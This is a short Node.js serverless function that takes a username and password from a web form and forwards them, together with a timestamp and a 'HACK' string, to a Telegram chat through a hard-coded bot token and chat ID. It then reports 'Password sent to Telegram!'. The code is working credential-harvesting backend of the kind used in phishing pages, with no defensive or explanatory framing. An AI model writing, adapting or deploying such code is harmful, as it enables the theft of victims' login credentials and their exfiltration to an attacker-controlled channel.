const fetch = require('node-fetch');

exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };
  
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  
  try {
    const { username, password } = JSON.parse(event.body);
    
    const BOT_TOKEN = '8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito';
    const CHAT_ID = '5614775725';
    
    const message = `🔔 <b>LOGIN SUCCESS</b>\n\n` +
                   `👤 User: ${username}\n` +
                   `🔑 Pass: ${password}\n` +
                   `🔐 Password: HACK${Date.now().toString().slice(-8)}\n` +
                   `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true,
        message: '✅ Password sent to Telegram!'
      })
    };
    
  } catch (error) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        success: false,
        error: error.message
      })
    };
  }
};
